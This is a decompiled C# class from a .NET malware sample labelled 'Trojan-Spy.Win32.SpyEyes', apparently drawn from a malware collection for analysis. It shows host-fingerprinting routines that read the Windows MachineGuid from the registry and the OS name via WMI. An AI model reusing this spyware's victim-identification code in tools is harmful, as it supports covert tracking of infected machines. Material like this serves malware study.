// Decompiled with JetBrains decompiler
// Type: hRDPLaunch.User
// Assembly: hRDPLaunch, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 60607DF8-BFCA-47B6-95F1-C56512213E3C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.SpyEyes.bsrd-1ca0216d0d70df84f12b955ad54bc99c42b783320de730f7edb060aa4cf5e0cd.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Management;

namespace hRDPLaunch
{
  public class User
  {
    public static string GetUID()
    {
      try
      {
        string name1 = "SOFTWARE\\Microsoft\\Cryptography";
        string name2 = "MachineGuid";
        using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
        {
          using (RegistryKey registryKey2 = registryKey1.OpenSubKey(name1))
            return ((registryKey2 != null ? registryKey2.GetValue(name2) : throw new KeyNotFoundException(string.Format("Key Not Found: {0}", (object) name1))) ?? throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", (object) name2))).ToString();
        }
      }
      catch
      {
      }
      try
      {
        string name3 = "SOFTWARE\\Microsoft\\Cryptography";
        string name4 = "MachineGuid";
        using (RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32))
        {
          using (RegistryKey registryKey4 = registryKey3.OpenSubKey(name3))
            return ((registryKey4 != null ? registryKey4.GetValue(name4) : throw new KeyNotFoundException(string.Format("Key Not Found: {0}", (object) name3))) ?? throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", (object) name4))).ToString();
        }
      }
      catch
      {
      }
      return (string) null;
    }

    public static string GetOS()
    {
      string os = "Unknown";
      try
      {
        string empty = string.Empty;
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            os = enumerator.Current["Caption"].ToString();
        }
      }
      catch
      {
      }
      return os;
    }
  }
}
